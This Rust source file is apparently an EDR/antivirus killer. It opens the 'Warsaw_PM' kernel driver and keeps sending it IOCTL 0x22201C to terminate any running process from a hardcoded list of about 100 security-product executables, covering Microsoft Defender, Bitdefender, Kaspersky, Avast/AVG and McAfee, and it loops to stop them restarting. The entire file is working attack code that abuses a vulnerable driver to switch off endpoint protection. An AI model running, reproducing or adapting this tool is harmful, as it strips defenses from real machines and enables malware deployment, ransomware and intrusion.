use ctrlc;
use anyhow::{Context, Result, bail};
use std::ptr;
use std::ffi::CStr;
use std::mem::size_of;
use std::os::windows::ffi::OsStrExt;
use std::ffi::OsStr;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::winnt::{GENERIC_WRITE, GENERIC_READ, HANDLE};
use winapi::um::fileapi::{CreateFileW, OPEN_EXISTING};
use winapi::shared::minwindef::LPVOID;
use winapi::um::ioapiset::DeviceIoControl;


const PROCESSES: &[&str] = &[
    // Microsoft Defender
    "MsMpEng.exe",
    "MsMpEngCP.exe",
    "MpCmdRun.exe",
    "NisSrv.exe",
    "SecurityHealthService.exe",
    "SecurityHealthHost.exe",
    "SecurityHealthSystray.exe",
    "MsSense.exe",
    "MsSecFw.exe",
    "MsMpSigUpdate.exe",
    "MsMpGfx.exe",
    "MpDwnLd.exe",
    "MpSigStub.exe",
    "MsMpCom.exe",
    "MSASCui.exe",
    "WindowsDefender.exe",
    "WdNisSvc.exe",
    "WinDefend.exe",
    "smartscreen.exe",
    
    // Bitdefender
    "vsserv.exe",
    "bdservicehost.exe",
    "bdagent.exe",
    "bdwtxag.exe",
    "updatesrv.exe",
    "bdredline.exe",
    "bdscan.exe",
    "seccenter.exe",
    "bdsubwiz.exe",
    "bdmcon.exe",
    "bdtws.exe",
    "bdntwrk.exe",
    "bdfwfpf.exe",
    "bdrepair.exe",
    "bdwtxcfg.exe",
    "bdamsi.exe",
    "bdscriptm.exe",
    "bdfw.exe",
    "bdsandbox.exe",
    "bdenterpriseagent.exe",
    "bdappspider.exe",
    
    // Kaspersky
    "avp.exe",
    "avpui.exe",
    "klnagent.exe",
    "klnsacsvc.exe",
    "klnfw.exe",
    "kavfs.exe",
    "kavfsslp.exe",
    "kavfsgt.exe",
    "kmon.exe",
    "ksde.exe",
    "ksdeui.exe",
    "kavtray.exe",
    "kpf4ss.exe",
    "kpm.exe",
    "ksc.exe",
    "klnupdate.exe",
    
    // Avast/AVG
    "AvastSvc.exe",
    "AvastUI.exe",
    "AvastBrowserSecurity.exe",
    "aswEngSrv.exe",
    "aswToolsSvc.exe",
    "aswidsagent.exe",
    "avg.exe",
    "avgui.exe",
    "avgnt.exe",
    "avgsvc.exe",
    "avgidsagent.exe",
    "avgemc.exe",
    "avgmfapx.exe",
    "avgsvca.exe",
    "avgwdsvc.exe",
    "avgupsvc.exe",
    
    // McAfee
    "McAfeeService.exe",
    "McAPExe.exe",
    "mcshield.exe",
    "mfemms.exe",
    "mfeann.exe",
    "mfefire.exe",
    "mfemactl.exe",
    "mfehcs.exe",
    "mfemmseng.exe",
    "mfevtps.exe",
    "mcagent.exe",
    "mctray.exe",
    "mcuicnt.exe",
    "mcmscsvc.exe",
    "mcnasvc.exe",
    "mcpromgr.exe",
    "mcods.exe",
    "mctask.exe",
    "mcsacore.exe",
    "mcscript.exe",
    "mfeffcoreservice.exe",
    "mfetp.exe",
    "mfevtp.exe",
];


fn pid_by_name(name: &str) -> Result<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if snapshot == INVALID_HANDLE_VALUE {
            bail!("[!]  Failed to create process snapshot");
        }

        let mut entry: PROCESSENTRY32 = std::mem::zeroed();
        entry.dwSize = size_of::<PROCESSENTRY32>() as u32;

        if Process32First(snapshot, &mut entry) == 0 {
            CloseHandle(snapshot);
            bail!("[!] Failed to get first process");
        }

        loop {
            let exe_name = CStr::from_ptr(entry.szExeFile.as_ptr()).to_string_lossy();

            if exe_name.eq_ignore_ascii_case(name) {
                let pid = entry.th32ProcessID;
                CloseHandle(snapshot);
                return Ok(pid);
            }

            if Process32Next(snapshot, &mut entry) == 0 {break}
        }

        CloseHandle(snapshot);
        bail!("[!]  Process '{}' not found", name);
    }
}



struct Driver {
    hDriver: HANDLE, 
}

impl Driver {
    /// Initializing the driver 
    
    fn Initialize() -> Result<Self> {

        let device_name: Vec<u16> = OsStr::new(r"\\.\Warsaw_PM")
            .encode_wide()
            .chain(Some(0))
            .collect();

        let result =  unsafe {
            CreateFileW(
                device_name.as_ptr(),
                GENERIC_READ | GENERIC_WRITE,
                0,
                ptr::null_mut(),
                OPEN_EXISTING,
                0,
                ptr::null_mut()
            )};
        
        if result == INVALID_HANDLE_VALUE {
            bail!("[!] Failed to initialize the driver!");
            }

        println!("[+] Driver initialized successfully!");

        Ok(Self{hDriver: result})
    }

    fn ExecuteIOCTL(&self, pid: u32) -> Result<()> {
    
        let mut buffer = vec![0u8; 1036];
        
        // WRITE THE PID TO FIRST 4 BYTES
        buffer[0..4].copy_from_slice(&pid.to_le_bytes());
        
        let mut bytes_returned = 0;
        
        let result = unsafe {
            DeviceIoControl(
                self.hDriver,
                0x22201C,
                buffer.as_mut_ptr() as LPVOID, 
                1036,
                ptr::null_mut(),        
                0,
                &mut bytes_returned,
                ptr::null_mut(),
            )
        };
        
        if result == 0 {
            
            let error_code = unsafe { GetLastError() };
            unsafe {CloseHandle(self.hDriver)};
            println!("[!] DeviceIoControl failed! Error code: 0x{:08X}", error_code);

        }
        
        println!("[+] IOCTL 0x22201C sent for PID: {}", pid);
        Ok(())  
    }

    fn Cleanup(&self) -> Result<()> {
        
        let result = unsafe {CloseHandle(self.hDriver)};

        if result == 0 {
            bail!("[!] Failed to close the driver's handle!!")
        }
        
        println!("[*] Driver Handle closed!");
        
        Ok(())
    }

}


fn main() -> Result<()> {

    let hDriver = Driver::Initialize()?;
    println!("[+] Driver ready for operation, Handle: {:p}", &hDriver);
    println!("[*] Scanning for target processes...");
    println!("[*] Press CTRL+C to stop...");

    // CTRL+C Handler setup
    let running = Arc::new(AtomicBool::new(true));
    ctrlc::set_handler({
            let running = Arc::clone(&running);
            move || {
                println!("[!] Shutting down...");
                running.store(false, Ordering::SeqCst);
            }
        })?;
    
    // Loop to prevent processes for restarting
    while running.load(Ordering::SeqCst) {
        for p in PROCESSES {
            if let Ok(pid) = pid_by_name(p) {
                println!("  -- Found {} - PID: {}", p, pid, );
                println!("[*] Killing {} ...", p);
                let result = hDriver.ExecuteIOCTL(pid)?;

            }
        }

    }

    println!("[*] Cleaning up ...");
    hDriver.Cleanup()?;

    Ok(())
}

